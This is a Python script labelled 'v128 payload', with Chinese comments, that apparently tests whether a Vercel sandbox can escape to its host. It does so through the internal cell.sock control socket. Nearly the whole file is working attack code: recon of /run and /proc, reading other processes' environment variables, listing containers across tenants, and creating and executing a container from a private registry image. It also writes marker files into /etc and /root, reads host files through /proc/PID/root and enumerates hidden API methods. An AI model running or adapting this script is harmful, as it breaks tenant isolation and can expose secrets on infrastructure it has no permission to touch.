# -*- coding: utf-8 -*-
"""v128 payload: host cell.sock 决定性验证
0 侦察: /run/cell 归属 / proc 视角 (host or guest)
1 List 容器 (跨租户检测)
2 Create+Start -> 新 pid 扫描 (host pid ns?)
3 Exec -> 新 pid 扫描 + /proc/PID/root 检查 (host FS 访问!)
4 StreamOutput 变体拿输出
5 方法枚举补充
6 Mount/Usage 细节
输出 /vercel/sandbox/v128c.out"""
import socket, struct, time, json, os, signal

OUT = '/vercel/sandbox/v128c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


CELL = '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
PROC = '/vercel.hive.cell.api.processes.v1.ProcessService'
USAGE = '/vercel.hive.cell.api.usage.v1.UsageService'
CELLS = '/vercel.hive.api.cells.v1.CellsService'
IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'


def connect_unix(sockpath, path, body, t=6.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return status, d[hdr_end + 4:hdr_end + 4 + 1200] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def dechunk(d):
    out = b''
    off = 0
    while off < len(d):
        i = d.find(b'\r\n', off)
        if i < 0:
            break
        try:
            ln = int(d[off:i].split(b';')[0], 16)
        except Exception:
            break
        if ln == 0:
            break
        out += d[i + 2:i + 2 + ln]
        off = i + 2 + ln + 2
    return out


def stream_data(sockpath, path, payload, ctype, t=12.0):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        env1 = b'\x00' + struct.pack('>I', len(payload)) + payload
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\n\r\n'
               % (path, ctype, len(env1))).encode() + env1
        s.sendall(req)
        s.shutdown(socket.SHUT_WR)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        body = d[hdr_end + 4:] if hdr_end > 0 else b''
        body = dechunk(body)
        return status, body
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def scan_pids():
    """扫描 /proc 返回 {pid: comm}"""
    out = {}
    try:
        for d in os.listdir('/proc'):
            if not d.isdigit():
                continue
            try:
                out[int(d)] = open('/proc/%s/comm' % d).read().strip()
            except Exception:
                pass
    except Exception:
        pass
    return out


def pid_info(pid):
    res = []
    for p in ['cmdline', 'status', 'cgroup', 'environ']:
        try:
            if p == 'cmdline':
                v = open('/proc/%d/cmdline' % pid, 'rb').read()[:400].replace(b'\x00', b' ')
                res.append('cmdline=%r' % v.decode(errors='replace'))
            elif p == 'status':
                v = open('/proc/%d/status' % pid).read()[:800]
                res.append('status=' + '|'.join(l for l in v.splitlines() if l.startswith(('Name:', 'Uid:', 'Gid:', 'NSpid:', 'CapEff:', 'Seccomp:'))))
            elif p == 'cgroup':
                res.append('cgroup=' + open('/proc/%d/cgroup' % pid).read().replace('\n', ' | '))
            else:
                v = open('/proc/%d/environ' % pid, 'rb').read()[:300].replace(b'\x00', b' ')
                res.append('environ=%r' % v.decode(errors='replace'))
        except Exception as e:
            res.append('%s=EXC %s' % (p, e))
    return ' '.join(res)


# ---------------- 0: recon ----------------
log('=== 0 recon ===')
for p in ['/run/cell', '/run/cell/cell.sock', '/run/vercel', '/run/vercel/share']:
    try:
        st = os.stat(p)
        log('stat %s: mode=%o uid=%d gid=%d' % (p, st.st_mode, st.st_uid, st.st_gid))
    except Exception as e:
        log('stat %s EXC %s' % (p, e))
try:
    log('ls /run/cell: %s' % os.listdir('/run/cell'))
except Exception as e:
    log('ls /run/cell EXC %s' % e)
try:
    log('ls /run/vercel: %s' % os.listdir('/run/vercel'))
except Exception as e:
    log('ls /run/vercel EXC %s' % e)
try:
    log('pid1 cmdline: %r' % open('/proc/1/cmdline', 'rb').read()[:300])
except Exception as e:
    log('pid1 EXC %s' % e)
try:
    procs = scan_pids()
    log('proc count: %d' % len(procs))
    interesting = [(p, c) for p, c in procs.items() if 'cell' in c or 'containerd' in c or 'firecracker' in c
                   or 'sandbox' in c or 'vercel' in c or 'runc' in c or 'shim' in c]
    log('interesting procs: %s' % interesting[:30])
except Exception as e:
    log('scan EXC %s' % e)

# ---------------- 1: List ----------------
log('=== 1 List ===')
st, pay = connect_unix(CELL, '%s/List' % CTRS, b'{}', t=4)
log('CTRS/List -> %s %r' % (st, pay[:600]))
st, pay = connect_unix(CELL, '%s/List' % PROC, b'{}', t=4)
log('PROC/List -> %s %r' % (st, pay[:600]))

# ---------------- 2: Create + Start ----------------
log('=== 2 Create+Start ===')
before = scan_pids()
log('pids before: %d' % len(before))
st, pay = connect_unix(CELL, '%s/Create' % CTRS, json.dumps({'image': IMG}).encode(), t=12)
log('Create -> %s %r' % (st, pay[:500]))
cid = None
try:
    cid = json.loads(pay.decode()).get('containerId')
except Exception:
    pass
log('cid=%s' % cid)
if not cid:
    f.close()
    raise SystemExit

st, pay = connect_unix(CELL, '%s/Start' % CTRS, json.dumps({'containerId': cid}).encode(), t=8)
log('Start -> %s %r' % (st, pay[:300]))
time.sleep(1.5)
after = scan_pids()
newp = [p for p in after if p not in before]
log('new pids after start: %s' % newp)
for p in newp:
    log('NEWPID %d: %s' % (p, pid_info(p)))
    try:
        log('NEWPID %d root ls: %s' % (p, os.listdir('/proc/%d/root' % p)[:30]))
    except Exception as e:
        log('NEWPID %d root EXC %s' % (p, e))

# ---------------- 3: Exec ----------------
log('=== 3 Exec ===')
CMD = ("echo ===E0===; id; hostname; pwd; uname -a; "
       "cat /proc/1/cmdline 2>&1 | head -c 400; echo; "
       "ls / 2>&1 | head -40; "
       "ls /run/vercel/ 2>&1; "
       "cat /proc/self/cgroup 2>&1; "
       "echo ===E1===; "
       "echo HOSTMARK1 > /tmp/hostm1.txt 2>&1; echo HOSTMARK2 > /etc/hostm2.txt 2>&1; "
       "echo HOSTMARK3 > /opt/hostm3.txt 2>&1; echo HOSTMARK4 > /root/hostm4.txt 2>&1; "
       "echo HOSTMARK5 > /run/hostm5.txt 2>&1; "
       "echo HOSTMARK6 > /vercel/hostm6.txt 2>&1; "
       "ls -la /tmp/ 2>&1 | head -20; "
       "echo ===E2===; sleep 180")
st, pay = connect_unix(CELL, '%s/Exec' % CTRS,
                       json.dumps({'containerId': cid, 'process': {'args': ['/bin/sh', '-c', CMD]}}).encode(), t=6)
log('Exec -> %s %r' % (st, pay[:300]))
pid = None
try:
    pid = json.loads(pay.decode()).get('processId')
except Exception:
    pass
log('processId=%s' % pid)
time.sleep(3)
after2 = scan_pids()
newp2 = [p for p in after2 if p not in after]
log('new pids after exec: %s' % newp2)
for p in newp2:
    log('EXECPID %d: %s' % (p, pid_info(p)))
    try:
        log('EXECPID %d root ls: %s' % (p, os.listdir('/proc/%d/root' % p)[:30]))
    except Exception as e:
        log('EXECPID %d root EXC %s' % (p, e))
    # marker 检查: 通过 exec 进程的 root 视角
    for mp in ['tmp/hostm1.txt', 'etc/hostm2.txt', 'opt/hostm3.txt', 'root/hostm4.txt',
               'run/hostm5.txt', 'vercel/hostm6.txt', 'tmp/cellm1.txt']:
        try:
            log('EXECPID %d root %s: %r' % (p, mp, open('/proc/%d/root/%s' % (p, mp)).read().strip()))
        except Exception as e:
            log('EXECPID %d root %s EXC %s' % (p, mp, e))
    # 从 exec 进程 root 读 /proc 里其他信息
    try:
        log('EXECPID %d root/etc/hostname: %r' % (p, open('/proc/%d/root/etc/hostname' % p).read().strip()))
    except Exception as e:
        log('EXECPID %d hostname EXC %s' % (p, e))

# ---------------- 4: StreamOutput ----------------
log('=== 4 StreamOutput ===')
if pid:
    variants = [
        ('json-stdout', json.dumps({'processId': pid, 'stream': 'stdout'}).encode(), 'application/connect+json'),
        ('json-stderr', json.dumps({'processId': pid, 'stream': 'stderr'}).encode(), 'application/connect+json'),
        ('json-only', json.dumps({'processId': pid}).encode(), 'application/connect+json'),
        ('proto0', b'\x0a' + bytes([len(pid)]) + pid.encode() + b'\x10\x00', 'application/connect+proto'),
        ('proto1', b'\x0a' + bytes([len(pid)]) + pid.encode() + b'\x10\x01', 'application/connect+proto'),
    ]
    for name, v, ct in variants:
        st, out = stream_data(CELL, '%s/StreamOutput' % PROC, v, ct, t=10)
        txt = ''.join(chr(b) for b in out if 32 <= b < 127 or b in (10, 13))
        log('SO[%s] %s out=%r' % (name, st, txt[:800]))
    st, pay = connect_unix(CELL, '%s/Wait' % PROC, json.dumps({'processId': pid}).encode(), t=12)
    log('PROC/Wait -> %s %r' % (st, pay[:300]))
    st, pay = connect_unix(CELL, '%s/Kill' % PROC, json.dumps({'processId': pid}).encode(), t=4)
    log('PROC/Kill -> %s %r' % (st, pay[:300]))

# ---------------- 5: method enum ----------------
log('=== 5 method enum ===')
for m in ['Get', 'Inspect', 'Delete', 'Remove', 'Stop', 'Pause', 'Resume', 'Restart', 'List']:
    st, pay = connect_unix(CELL, '%s/%s' % (CTRS, m), json.dumps({'containerId': cid}).encode(), t=3)
    log('CTRS/%s -> %s %r' % (m, st, pay[:250]))
for m in ['RunCell', 'PoolCell', 'StartCell', 'StopCell', 'GetCellAddress', 'IsCellAlive',
          'ExtendExecutionTimeout', 'RunCommand', 'ListCells', 'GetCell']:
    st, pay = connect_unix(CELL, '%s/%s' % (CELLS, m), b'{}', t=3)
    log('CELLS/%s -> %s %r' % (m, st, pay[:250]))

# ---------------- 6: Usage/Mount ----------------
log('=== 6 Usage/Mount ===')
st, pay = connect_unix(CELL, '%s/GetResourceUsage' % USAGE, b'{}', t=3)
log('USAGE/GetResourceUsage -> %s %r' % (st, pay[:300]))
for m, body in [('Mount', {}), ('Mount', {'containerId': cid}), ('Mount', {'driveId': 'x'}),
                ('Mount', {'driveId': cid})]:
    st, pay = connect_unix(CELL, '%s/%s' % (CTRS, m), json.dumps(body).encode(), t=4)
    log('CTRS/Mount %r -> %s %r' % (body, st, pay[:300]))

# cleanup
st, pay = connect_unix(CELL, '%s/Kill' % CTRS, json.dumps({'containerId': cid}).encode(), t=3)
log('Cleanup Kill -> %s' % st)
st, pay = connect_unix(CELL, '%s/Delete' % CTRS, json.dumps({'containerId': cid}).encode(), t=3)
log('Cleanup Delete -> %s %r' % (st, pay[:200]))

log('V128_DONE')
f.close()
